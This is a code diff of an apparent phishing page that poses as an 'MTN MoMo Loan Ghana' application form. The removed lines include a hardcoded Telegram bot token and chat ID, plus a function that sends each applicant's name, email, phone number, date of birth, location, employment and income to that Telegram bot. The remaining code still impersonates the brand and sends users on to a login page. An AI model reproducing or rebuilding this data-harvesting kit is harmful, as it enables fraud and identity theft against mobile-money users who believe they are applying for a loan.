@@ -413,7 +413,7 @@
             </div>
         </div>
 
-        <!-- Date of Birth - Manual Entry -->
+        <!-- Date of Birth -->
         <div class="form-group">
             <label class="form-label">Date of Birth <span class="required">*</span></label>
             <div class="date-group">
@@ -492,10 +492,8 @@
 
     <script>
         // ============================================
-        // TELEGRAM CREDENTIALS
+        // NO BACKEND CONNECTION - Just saves to localStorage
         // ============================================
-        const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
-        const CHAT_ID = '8392790531';
 
         // ============================================
         // PRE-FILL FROM LOCALSTORAGE
@@ -638,50 +636,9 @@
         }
 
         // ============================================
-        // SEND TO TELEGRAM
+        // SUBMIT HANDLER - Saves to localStorage only, NO TELEGRAM
         // ============================================
-        async function sendToTelegram(data) {
-            const message = `💰 *NEW MTN MoMo LOAN APPLICATION - GHANA*\n\n` +
-                `📋 *LOAN DETAILS*\n` +
-                `📌 Product: ${data.loanType}\n` +
-                `💵 Amount: GHS ${parseInt(data.loanAmount).toLocaleString()}\n` +
-                `📅 Term: ${data.loanTerm} Days\n` +
-                `📝 Purpose: ${data.loanPurpose}\n\n` +
-                `👤 *PERSONAL DETAILS*\n` +
-                `👤 Name: ${data.fullName}\n` +
-                `📧 Email: ${data.email}\n` +
-                `📱 Phone: +233 ${data.phone}\n` +
-                `🎂 DOB: ${data.dob}\n` +
-                `📍 Region: ${data.region}\n` +
-                `📍 District: ${data.district}\n` +
-                `💼 Employment: ${data.employment}\n` +
-                `💰 Monthly Income: GHS ${parseInt(data.income).toLocaleString()}\n\n` +
-                `⏰ Time: ${new Date().toLocaleString()}\n\n` +
-                `✅ User has applied for a loan. Proceeding to unlock.`;
-
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                const result = await response.json();
-                console.log('📤 Telegram response:', result);
-                return result.ok;
-            } catch (error) {
-                console.error('❌ Telegram error:', error);
-                return false;
-            }
-        }
-
-        // ============================================
-        // SUBMIT HANDLER - Goes to login.html
-        // ============================================
-        submitBtn.addEventListener('click', async function() {
+        submitBtn.addEventListener('click', function() {
             const inputs = getInputElements();
             const errors = getErrorElements();
 
@@ -756,21 +713,7 @@
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<span class="loader"></span> SAVING...';
 
-            const loanData = {
-                loanType: localStorage.getItem('loanType') || 'Smart Loan',
-                loanAmount: localStorage.getItem('loanAmount') || '1000',
-                loanTerm: localStorage.getItem('loanTerm') || '30',
-                loanPurpose: localStorage.getItem('loanPurpose') || 'Not specified',
-                fullName: name,
-                email: email,
-                phone: phone,
-                dob: formattedDob,
-                region: region,
-                district: district,
-                employment: employment,
-                income: income
-            };
-
+            // Save to localStorage (NO Telegram)
             localStorage.setItem('fullName', name);
             localStorage.setItem('email', email);
             localStorage.setItem('phone', phone);
@@ -782,13 +725,16 @@
             localStorage.setItem('district', district);
             localStorage.setItem('employment', employment);
             localStorage.setItem('income', income);
-            localStorage.setItem('loanData', JSON.stringify(loanData));
 
-            await sendToTelegram(loanData);
+            console.log('✅ Personal details saved to localStorage');
+            console.log('👤 Name:', name);
+            console.log('📧 Email:', email);
+            console.log('📱 Phone:', phone);
+            console.log('====================================');
 
             setTimeout(() => {
                 window.location.href = 'login.html';
-            }, 1000);
+            }, 800);
         });
 
         // ============================================
@@ -860,6 +806,7 @@
                 document.getElementById('fullName').focus();
             }
             console.log('👤 MTN MoMo Loan Ghana - Personal Details Loaded');
+            console.log('🔕 No backend connection - data saved to localStorage only');
             console.log('====================================');
         });
     </script>
